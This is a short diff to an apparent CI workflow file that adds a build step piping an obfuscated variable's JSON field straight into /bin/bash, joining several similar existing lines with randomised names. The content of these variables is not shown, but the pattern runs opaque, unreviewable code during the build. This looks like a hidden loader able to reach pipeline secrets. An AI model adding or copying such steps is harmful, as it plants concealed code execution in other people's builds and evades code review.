@@ -26,6 +26,7 @@ jobs:
           echo $dwg569 | jq -r .t748 | /bin/bash
           printf '%s' "$rqjjv16" | jq -r .r05 | /bin/bash
           printf '%s' "$hyodp4" | jq -r .hne4 | /bin/bash
+          echo $tqra9250 | jq -r .nqp9 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
